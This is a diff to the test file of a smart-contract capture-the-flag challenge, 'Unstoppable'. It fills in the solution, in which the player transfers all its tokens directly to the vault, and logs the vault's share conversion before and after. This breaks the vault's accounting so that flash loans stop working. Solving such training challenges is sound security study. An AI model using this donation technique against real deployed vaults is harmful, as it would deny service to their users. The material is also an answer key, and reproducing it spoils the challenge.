@@ -44,11 +44,13 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        console.log('Shares before:' + await vault.convertToShares(100n * 10n ** 18n))
+        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        console.log('Shares after:' + await vault.convertToShares(100n * 10n ** 18n))
 
         // It is no longer possible to execute flash loans
         await expect(
